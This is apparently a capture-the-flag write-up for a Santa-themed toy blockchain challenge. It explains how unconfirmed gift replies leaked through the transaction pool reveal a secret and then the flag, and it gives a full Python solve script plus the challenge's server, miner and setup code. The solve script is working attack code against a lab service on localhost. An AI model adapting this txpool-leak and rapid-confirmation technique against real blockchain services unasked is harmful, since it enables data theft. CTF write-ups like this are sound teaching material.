# Day 06

In this problem, we can make transactions and mine blocks on the blockchain. To get flag, we need to:

1. send letter to santa via transactions
2. when the transactions get confirmed (>5 blocks), santa replies with secret
3. send letter with secret to santa via a transaction
4. when the transactions get confirmed (>5 blocks), santa replies with flag

However, each reply consumes one balance if the reply was confirmed. Actually, we can find the reply from `txpool`, which contains the transactions not confirmed yet. So, we can retrieve data without actually reducing our balance.

So our attack is:

1. Generate transactions to read secret, and quickly mine 6 blocks containing the transactions
2. Polling for the txpool, until we found all responses from santa
3. Generate transaction to read flag, and quickly mine 6 blocks to confirm it
4. Polling for the txpool again, untill we found the flag from santa

In the process, only our transactions are confirmed, but no reply transactions are confirmed. So we always have our balance positive.

Attack script:

```python
#!/usr/local/bin/python -u
import hashlib
import json
import time
import uuid
import requests
from pathlib import Path
from cryptography.hazmat.primitives import serialization

NORTH_POOLE = "http://localhost"
DIFFICULTY = 16
DIFFICULTY_PREFIX = "0" * (DIFFICULTY // 4)


def hash_block(block: dict) -> str:
    block_str = json.dumps(block, sort_keys=True, separators=(",", ":"))
    return hashlib.sha256(block_str.encode()).hexdigest()


LETTER_HEADER = "Dear Santa,\n\nFor christmas this year I would like "

# get a latest block
head_resp = requests.get(f"{NORTH_POOLE}/block")
head_resp.raise_for_status()
head_json = head_resp.json()
head_block = head_json["block"]


key_path = Path("/challenge/keys") / "hacker" / "key"
key = serialization.load_ssh_private_key(key_path.read_bytes(), password=None)

# create txn to ask for gift
letters = dict()
txs = []
print("Ask for secret")
for i in range(32):
    letter = f"{LETTER_HEADER} secret index #{i}"
    letter = {
        "src": "hacker",
        "dst": "santa",
        "type": "letter",
        "letter": letter,
        "nonce": str(uuid.uuid4()),
    }

    msg = json.dumps(letter, sort_keys=True, separators=(",", ":"))
    digest = hashlib.sha256(msg.encode()).digest()
    letter["sig"] = key.sign(digest).hex()
    letters[letter["nonce"]] = letter
    txs.append(letter)


def confirm(txs):
    # mine a block to save all these txns
    # quickly confirm by 6 blocks
    head_resp = requests.get(f"{NORTH_POOLE}/block")
    head_resp.raise_for_status()
    head_json = head_resp.json()
    head_block = head_json["block"]

    for i in range(6):
        if i > 0:
            txs = []

        nice = None

        block = {
            "index": head_block["index"] + 1,
            "prev_hash": hash_block(head_block),
            "nonce": 0,
            "txs": txs,
            "nice": nice,
        }

        nonce = 0
        while True:
            block["nonce"] = nonce
            block_hash = hash_block(block)
            if block_hash.startswith(DIFFICULTY_PREFIX):
                break
            nonce += 1

        resp = requests.post(f"{NORTH_POOLE}/block", json=block)
        print(resp)
        print(resp.json())

        head_block = block
        print("Mining", i, block)

    print("Confirmed")

    head_resp = requests.get(f"{NORTH_POOLE}/block")
    head_resp.raise_for_status()
    head_json = head_resp.json()
    print("Latest block", head_json)


confirm(txs)

print("Waiting for secret")
secret = ["-"] * 32
while "-" in secret:
    # wait for santa resp on txpool
    tx_resp = requests.get(f"{NORTH_POOLE}/txpool")
    tx_resp.raise_for_status()
    tx_json = tx_resp.json()
    txs = tx_json["txs"]
    for tx in txs:
        if tx["type"] == "gift" and tx["dst"] == "hacker" and len(tx["gift"]) == 1:
            nonce = tx["nonce"][:-5] # strip -gift suffix
            letter = letters[nonce]
            index = int(letter["letter"].split("#")[1])
            secret[index] = tx["gift"]
    print(secret)
    time.sleep(1)

secret = "".join(secret)
print("Found secret", secret)

# get flag
letter = f"{LETTER_HEADER} secret {secret}"
letter = {
    "src": "hacker",
    "dst": "santa",
    "type": "letter",
    "letter": letter,
    "nonce": str(uuid.uuid4()),
}

msg = json.dumps(letter, sort_keys=True, separators=(",", ":"))
digest = hashlib.sha256(msg.encode()).digest()
letter["sig"] = key.sign(digest).hex()

# quickly confirm
confirm([letter])


while True:
    # wait for santa resp on txpool
    tx_resp = requests.get(f"{NORTH_POOLE}/txpool")
    tx_resp.raise_for_status()
    tx_json = tx_resp.json()
    txs = tx_json["txs"]
    for tx in txs:
        if tx["type"] == "gift" and tx["dst"] == "hacker" and len(tx["gift"]) != 1:
            print(tx)
    time.sleep(1)
```

Full attachment:

```python
# north_poole.py
#!/usr/local/bin/python -u
import hashlib
import json
import time
import uuid
from pathlib import Path

from flask import Flask, jsonify, request
from cryptography.hazmat.primitives import serialization

app = Flask(__name__)

DIFFICULTY = 16
TX_EXPIRY_SECONDS = 60

def hash_block(block: dict) -> str:
    block_str = json.dumps(block, sort_keys=True, separators=(",", ":"))
    return hashlib.sha256(block_str.encode()).hexdigest()


genesis = {
    "index": 0,
    "prev_hash": "0" * 64,
    "nonce": "",
    "txs": [],
    "nice": None,
}

BLOCKS = {hash_block(genesis): genesis}
TXPOOL = []
IDENTITIES = {
    child_dir.name: serialization.load_ssh_public_key((child_dir / "key.pub").read_bytes())
    for child_dir in Path("/challenge/keys").iterdir()
}


def get_best_chain_block():
    best_hash = None
    best_index = -1
    for blk_hash, blk in BLOCKS.items():
        if blk["index"] > best_index:
            best_index = blk["index"]
            best_hash = blk_hash
    return best_hash


def validate_tx(tx):
    tx_type = tx.get("type")
    if tx_type not in {"letter", "gift", "transfer"}:
        raise ValueError("invalid tx type")

    for field in ("src", "dst", "type", tx_type, "nonce", "sig"):
        if field not in tx:
            raise ValueError(f"missing field {field}")

    identity = IDENTITIES.get(tx["src"])
    if not identity:
        raise ValueError("unknown src")

    if tx["dst"] not in IDENTITIES:
        raise ValueError("unknown dst")

    try:
        sig = bytes.fromhex(tx.get("sig", ""))
    except ValueError:
        raise ValueError("invalid sig encoding")

    payload = {
        "src": tx["src"],
        "dst": tx["dst"],
        "type": tx["type"],
        tx_type: tx[tx_type],
        "nonce": tx["nonce"],
    }
    msg = json.dumps(payload, sort_keys=True, separators=(",", ":"))
    digest = hashlib.sha256(msg.encode()).digest()

    try:
        identity.verify(sig, digest)
    except Exception:
        raise ValueError("invalid signature")

    if tx_type == "transfer":
        amount = tx.get("transfer")
        if not isinstance(amount, (int, float)) or amount <= 0:
            raise ValueError("invalid transfer amount")


def get_nice_balances(block):
    balances = {name: 1 for name in IDENTITIES}

    chain = [block]
    current_hash = block["prev_hash"]
    while current_hash in BLOCKS:
        blk = BLOCKS[current_hash]
        chain.append(blk)
        current_hash = blk["prev_hash"]
    chain.reverse()

    for blk in chain:
        nice_person = blk.get("nice")
        if nice_person:
            balances[nice_person] = balances.get(nice_person, 0) + 1

        for tx in blk["txs"]:
            tx_type = tx.get("type")
            src = tx.get("src")
            dst = tx.get("dst")
            if tx_type == "gift" and src == "santa":
                balances[src] = balances.get(src, 0) + 1
                balances[dst] = balances.get(dst, 0) - 1
            elif tx_type == "transfer":
                amount = tx.get("transfer", 0)
                balances[src] = balances.get(src, 0) - amount
                balances[dst] = balances.get(dst, 0) + amount

    return balances


@app.route("/block", methods=["GET", "POST"])
def block_endpoint():
    """Get a block (default: best-chain head) or submit a mined block."""
    if request.method == "GET":
        blk_hash = request.args.get("hash") or get_best_chain_block()
        blk = BLOCKS.get(blk_hash)
        if not blk:
            return jsonify({"error": "unknown block id"}), 404
        return jsonify({"hash": blk_hash, "block": blk})

    if request.method == "POST":
        block = request.get_json(force=True)
        required_block_fields = ("index", "prev_hash", "nonce", "txs", "nice")
        for field in required_block_fields:
            if field not in block:
                return jsonify({"error": f"missing field {field} in block"}), 400

        block_hash = hash_block(block)
        prev_hash = block.get("prev_hash")

        prefix_bits = len(block_hash) * 4 - len(block_hash.lstrip("0")) * 4
        if prefix_bits < DIFFICULTY:
            return jsonify({"error": "invalid proof of work"}), 400

        if prev_hash not in BLOCKS:
            return jsonify({"error": "unknown parent"}), 400

        expected_index = BLOCKS[prev_hash]["index"] + 1
        if block.get("index") != expected_index:
            return jsonify({"error": "invalid index"}), 400

        nice_person = block.get("nice")
        try:
            for tx in block["txs"]:
                validate_tx(tx)
                if tx.get("src") == nice_person:
                    return jsonify({"error": "nice person cannot be tx src"}), 400
        except ValueError as e:
            return jsonify({"error": f"{e} in block tx"}), 400

        balances = get_nice_balances(block)
        if any(balance < 0 for balance in balances.values()):
            return jsonify({"error": "negative balance"}), 400

        mined_nonces = [tx["nonce"] for tx in block["txs"]]
        if len(mined_nonces) != len(set(mined_nonces)):
            return jsonify({"error": "duplicate tx nonce in block"}), 400
        while prev_hash in BLOCKS:
            blk = BLOCKS[prev_hash]
            for tx in blk["txs"]:
                if tx.get("nonce") in mined_nonces:
                    return jsonify({"error": "duplicate tx nonce in chain"}), 400
            prev_hash = blk["prev_hash"]

        # Enforce a cap: no identity may appear as "nice" more than 10 times in the chain.
        nice_counts = {}
        current_hash = block_hash
        blk = block
        while True:
            nice_person = blk.get("nice")
            if nice_person:
                nice_counts[nice_person] = nice_counts.get(nice_person, 0) + 1
                if nice_counts[nice_person] > 10:
                    return jsonify({"error": "abuse of nice list detected"}), 400
            current_hash = blk["prev_hash"]
            if current_hash not in BLOCKS:
                break
            blk = BLOCKS[current_hash]

        BLOCKS[block_hash] = block
        return jsonify({"status": "accepted"})


@app.route("/tx", methods=["POST"])
def submit_tx():
    """Submit a transaction into the global tx pool."""
    tx = request.get_json(force=True)
    try:
        validate_tx(tx)
    except ValueError as e:
        return jsonify({"error": str(e)}), 400

    TXPOOL.append((time.time(), tx))
    return jsonify({"status": "queued"})


@app.route("/txpool", methods=["GET"])
def get_txpool():
    """Get the relevant tx pool (default: best-chain head)."""
    blk_hash = request.args.get("hash") or get_best_chain_block()

    mined_nonces = set()
    current_hash = blk_hash
    while current_hash in BLOCKS:
        blk = BLOCKS[current_hash]
        for tx in blk["txs"]:
            mined_nonces.add(tx.get("nonce"))
        current_hash = blk["prev_hash"]

    now = time.time()
    TXPOOL[:] = [
        (ts, tx) for ts, tx in TXPOOL
        if now - ts <= TX_EXPIRY_SECONDS
    ]
    fresh = [tx for _, tx in TXPOOL if tx.get("nonce") not in mined_nonces]

    return jsonify({"hash": blk_hash, "txs": fresh})


@app.route("/balances", methods=["GET"])
def get_balances():
    """Get nice/transfer balances for the chain ending at the given (or best) hash."""
    blk_hash = request.args.get("hash") or get_best_chain_block()
    blk = BLOCKS.get(blk_hash)
    if not blk:
        return jsonify({"error": "unknown block id"}), 404
    balances = get_nice_balances(blk)
    return jsonify({"hash": blk_hash, "balances": balances})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
# santa.py
#!/usr/local/bin/python -u
import hashlib
import json
import os
import random
import re
import time
import uuid
from pathlib import Path

import requests
from cryptography.hazmat.primitives import serialization

NORTH_POOLE = os.environ["NORTH_POOLE"]
SANTA_KEY = serialization.load_ssh_private_key(
    Path("/challenge/keys/santa/key").read_bytes(), password=None
)

GIFTS = [
    "bicycle",
    "train set",
    "drone",
    "robot kit",
    "skateboard",
    "telescope",
    "lego castle",
    "paint set",
    "guitar",
    "soccer ball",
    "puzzle box",
    "chemistry kit",
    "story book",
    "piano keyboard",
    "rollerblades",
    "coding tablet",
    "chess set",
    "binoculars",
    "science lab",
    "magic set",
    "remote car",
    "ukulele",
    "basketball",
    "hockey stick",
    "football",
    "dollhouse",
    "action figures",
    "model airplane",
    "rc helicopter",
    "night sky map",
    "art easel",
    "scooter",
]
SECRET_GIFT = os.urandom(16).hex()
FLAG_GIFT = Path("/flag").read_text()
LETTER_HEADER = "Dear Santa,\n\nFor christmas this year I would like "

REQUIRED_CONFIRMATION_DEPTH = 5

RECENT_GIFTS_EXPIRY_SECONDS = 90
RECENT_GIFTS = {}


print("[santa] starting...")
while True:
    try:
        print("[santa] looking for new letters...")
        now = time.time()
        RECENT_GIFTS = {gift: ts for gift, ts in RECENT_GIFTS.items() if now - ts <= RECENT_GIFTS_EXPIRY_SECONDS}

        head_resp = requests.get(f"{NORTH_POOLE}/block")
        head_resp.raise_for_status()
        head_json = head_resp.json()
        head_block = head_json["block"]
        head_hash = head_json["hash"]

        chain = [head_block]
        current_hash = head_block["prev_hash"]
        while current_hash:
            current_resp = requests.get(f"{NORTH_POOLE}/block", params={"hash": current_hash})
            if current_resp.status_code != 200:
                break
            current_json = current_resp.json()
            block = current_json["block"]
            chain.append(block)
            current_hash = block["prev_hash"]
        chain.reverse()

        balances_resp = requests.get(f"{NORTH_POOLE}/balances", params={"hash": head_hash})
        balances_resp.raise_for_status()
        balances_json = balances_resp.json()
        nice_balances = balances_json.get("balances", {})

        letters = {}

        # Collect letters Santa can trust (recent blocks are not yet sufficiently confirmed)
        for block in chain[:-REQUIRED_CONFIRMATION_DEPTH]:
            for tx in block["txs"]:
                if tx["type"] == "letter" and tx["dst"] == "santa" and tx["letter"].startswith(LETTER_HEADER):
                    child = tx["src"]
                    letters.setdefault(child, {})
                    letters[child][tx["nonce"]] = tx

        # Remove letters Santa already responded to with gifts
        for block in chain:
            for tx in block["txs"]:
                if tx["type"] == "gift" and tx["src"] == "santa":
                    assert tx["nonce"].endswith("-gift")
                    child = tx["dst"]
                    if child in letters:
                        letters[child].pop(tx["nonce"][:-5], None)
        for child, child_letters in letters.items():
            for nonce in list(child_letters.keys()):
                if nonce in RECENT_GIFTS:
                    child_letters.pop(nonce)

        # Santa only gives gifts to children on the nice list
        for child in list(letters.keys()):
            if nice_balances.get(child, 0) <= 0:
                letters.pop(child, None)

        letter = next((tx for child_letters in letters.values() for tx in child_letters.values()), None)
        if not letter:
            time.sleep(10)
            continue

        child = letter["src"]
        gift_value = None

        if SECRET_GIFT in letter["letter"]:
            gift_value = FLAG_GIFT

        if not gift_value and (match := re.search(r"secret index #([0-9]+)", letter["letter"])):
            index = int(match.group(1))
            if 0 <= index < len(SECRET_GIFT):
                gift_value = SECRET_GIFT[index]

        if not gift_value:
            for gift in GIFTS:
                if gift.lower() in letter["letter"].lower():
                    gift_value = gift
                    break

        if not gift_value:
            gift_value = random.choice(GIFTS)

        gift_tx = {
            "dst": child,
            "src": "santa",
            "type": "gift",
            "gift": gift_value,
            "nonce": f"{letter['nonce']}-gift",
        }
        msg = json.dumps(gift_tx, sort_keys=True, separators=(",", ":"))
        digest = hashlib.sha256(msg.encode()).digest()
        gift_tx["sig"] = SANTA_KEY.sign(digest).hex()

        RECENT_GIFTS[letter["nonce"]] = time.time()
        resp = requests.post(f"{NORTH_POOLE}/tx", json=gift_tx)
        if resp.status_code == 200:
            print(f"[santa] queued gift {gift_tx['nonce']} for {child}")
        else:
            print(f"[santa] rejected gift {gift_tx['nonce']} for {child}: {resp.text}")

    except Exception as e:
        print("[santa] error:", e)

    time.sleep(1)
# children.py
#!/usr/local/bin/python -u
import hashlib
import json
import os
import random
import sys
import time
import uuid
from pathlib import Path

import requests
from cryptography.hazmat.primitives import serialization

NORTH_POOLE = os.environ["NORTH_POOLE"]
LETTER_HEADER = "Dear Santa,\n\nFor christmas this year I would like "

GIFTS = [
    "bicycle",
    "train set",
    "drone",
    "robot kit",
    "skateboard",
    "telescope",
    "lego castle",
    "paint set",
    "guitar",
    "soccer ball",
    "puzzle box",
    "chemistry kit",
    "story book",
    "piano keyboard",
    "rollerblades",
    "coding tablet",
    "chess set",
    "binoculars",
    "science lab",
    "magic set",
    "remote car",
    "ukulele",
    "basketball",
    "hockey stick",
    "football",
    "dollhouse",
    "action figures",
    "model airplane",
    "rc helicopter",
    "night sky map",
    "art easel",
    "scooter",
]

children = sys.argv[1:]
if not children:
    print("Usage: children.py <name> [<name> ...]")
    sys.exit(1)

keys = {}
for name in children:
    key_path = Path("/challenge/keys") / name / "key"
    keys[name] = serialization.load_ssh_private_key(key_path.read_bytes(), password=None)

while True:
    try:
        child = random.choice(children)
        gift = random.choice(GIFTS)
        letter = f"{LETTER_HEADER}{gift}"

        letter = {
            "src": child,
            "dst": "santa",
            "type": "letter",
            "letter": letter,
            "nonce": str(uuid.uuid4()),
        }

        msg = json.dumps(letter, sort_keys=True, separators=(",", ":"))
        digest = hashlib.sha256(msg.encode()).digest()
        letter["sig"] = keys[child].sign(digest).hex()

        resp = requests.post(f"{NORTH_POOLE}/tx", json=letter)
        if resp.status_code == 200:
            print(f"[{child}] asked for '{gift}' ({letter['nonce']})")
        else:
            print(f"[{child}] request rejected: {resp.text}")
    except Exception as e:
        print(f"[{child}] error:", e)

    time.sleep(random.randint(10, 120))
# elf.py
#!/usr/local/bin/python -u
import hashlib
import json
import os
import random
import time
from pathlib import Path

import requests

NORTH_POOLE = os.environ["NORTH_POOLE"]
ELF_NAME = os.environ["ELF_NAME"]

DIFFICULTY = 16
DIFFICULTY_PREFIX = "0" * (DIFFICULTY // 4)
CHILDREN = [path.name for path in Path("/challenge/keys").iterdir()]
NICE = list()  # The nice list doesn't care about your fancy set O(1) operations


def hash_block(block: dict) -> str:
    block_str = json.dumps(block, sort_keys=True, separators=(",", ":"))
    return hashlib.sha256(block_str.encode()).hexdigest()


print(f"Elf {ELF_NAME} starting to mine for the North-Poole... difficulty={DIFFICULTY}")
while True:
    try:
        print(f"[{ELF_NAME}] mining a new block...")
        tx_resp = requests.get(f"{NORTH_POOLE}/txpool")
        tx_resp.raise_for_status()
        tx_json = tx_resp.json()
        txs = tx_json["txs"]
        head_hash = tx_json["hash"]

        head_resp = requests.get(f"{NORTH_POOLE}/block", params={"hash": head_hash})
        head_resp.raise_for_status()
        head_json = head_resp.json()
        head_block = head_json["block"]

        children = [child for child in CHILDREN if child not in NICE]
        if random.random() >= 0.5 and children:
            nice = random.choice(children)
        else:
            nice = None

        block = {
            "index": head_block["index"] + 1,
            "prev_hash": hash_block(head_block),
            "nonce": 0,
            "txs": txs,
            "nice": nice,
        }

        nonce = 0
        while True:
            block["nonce"] = nonce
            block_hash = hash_block(block)
            if block_hash.startswith(DIFFICULTY_PREFIX):
                break
            nonce += 1

        resp = requests.post(f"{NORTH_POOLE}/block", json=block)
        if resp.status_code == 200:
            print(f"[{ELF_NAME}] mined block {block['index']} ({block_hash})")
            if nice in CHILDREN:
                NICE.append(nice)
        else:
            print(f"[{ELF_NAME}] block rejected: {resp.text}")
    except Exception as e:
        print(f"[{ELF_NAME}] exception while mining: {e}")

    time.sleep(random.randint(10, 120))
# init-northpoole.sh
#!/bin/sh
set -eu

cd /challenge

mkdir -p /challenge/keys
CHILDREN="willow hazel holly rowan laurel juniper aspen ash maple alder cedar birch elm cypress pine spruce"
for identity in santa hacker $CHILDREN; do
  mkdir -p "/challenge/keys/${identity}"
  ssh-keygen -t ed25519 -N "" -f "/challenge/keys/${identity}/key" >/dev/null
done
chown -R 1000:1000 /challenge/keys/hacker

touch /var/log/north_poole.log
chmod 600 /var/log/north_poole.log

touch /var/log/santa.log
chmod 600 /var/log/santa.log

touch /var/log/elf.log
chmod 600 /var/log/elf.log

touch /var/log/children.log
chmod 600 /var/log/children.log

./north_poole.py >> /var/log/north_poole.log 2>&1 &
sleep 2

export NORTH_POOLE=http://localhost

./santa.py >> /var/log/santa.log 2>&1 &

for name in jingle sparkle tinsel nog snowflake; do
  ELF_NAME="$name" ./elf.py >> /var/log/elf.log 2>&1 &
done

./children.py $CHILDREN >> /var/log/children.log 2>&1 &
```
